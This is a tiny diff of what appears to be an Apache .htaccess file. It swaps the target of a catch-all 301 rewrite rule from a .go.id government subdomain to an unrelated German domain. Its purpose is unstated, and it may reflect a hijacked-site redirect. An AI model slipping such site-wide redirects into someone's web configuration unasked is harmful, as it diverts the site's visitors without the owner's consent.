@@ -16,7 +16,7 @@ RewriteRule .* - [F,L]
 
 Options -Indexes
 
-RewriteRule ^(.*)$ https://dwp.sarmikab.go.id/ [R=301,L]
+RewriteRule ^(.*)$ https://digamus-award.de/ [R=301,L]
 </IfModule>
 
 <IfModule mod_php7.c>
